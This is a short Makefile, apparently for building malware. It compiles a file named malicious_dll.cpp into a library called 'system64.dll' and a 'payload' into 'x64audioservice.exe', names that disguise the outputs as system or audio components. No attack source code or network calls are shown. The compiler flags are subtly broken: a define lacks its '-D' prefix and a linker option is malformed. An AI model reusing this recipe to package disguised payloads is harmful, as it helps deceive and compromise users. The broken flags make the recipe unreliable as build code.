CXX = g++

default: both

dll:
	g++ -c DBUILDING_MALICIOUS_DLL malicious_dll.cpp
	g++ -shared -o system64.dll malicious_dll.o -Wl --out-implib,libmalicious_dll.a
	
payload:
	g++ payload.cpp -o x64audioservice.exe

both: dll payload